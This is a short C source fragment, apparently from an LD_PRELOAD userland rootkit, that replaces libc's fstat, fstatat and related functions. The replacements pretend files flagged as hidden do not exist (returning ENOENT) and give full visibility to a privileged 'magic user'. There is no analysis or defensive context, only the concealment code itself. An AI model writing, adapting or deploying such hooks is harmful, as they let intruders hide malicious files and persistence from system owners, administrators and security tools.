int __fxstat(int version, int fd, struct stat *buf){
    hook(C__FXSTAT);
    if(magicusr()) return (long)call(C__FXSTAT, version, fd, buf);
    if(hidden_fd(fd)) { errno = ENOENT; return -1; }
    return (long)call(C__FXSTAT, version, fd, buf);
}
int __fxstat64(int version, int fd, struct stat64 *buf){
    hook(C__FXSTAT64);
    if(magicusr()) return (long)call(C__FXSTAT64, version, fd, buf);
    if(hidden_fd64(fd)) { errno = ENOENT; return -1; }
    return (long)call(C__FXSTAT64, version, fd, buf);
}
int fstatat(int dirfd, const char *pathname, struct stat *statbuf, int flags){
    hook(CFSTATAT);
    if(magicusr()) return (long)call(CFSTATAT, dirfd, pathname, statbuf, flags);
    if(hidden_path(pathname)) { errno = ENOENT; return -1; }
    return (long)call(CFSTATAT, dirfd, pathname, statbuf, flags);
}
int fstat(int fd, struct stat *buf){
    return __fxstat(_STAT_VER, fd, buf);
}
int fstat64(int fd, struct stat64 *buf){
    return __fxstat64(_STAT_VER, fd, buf);
}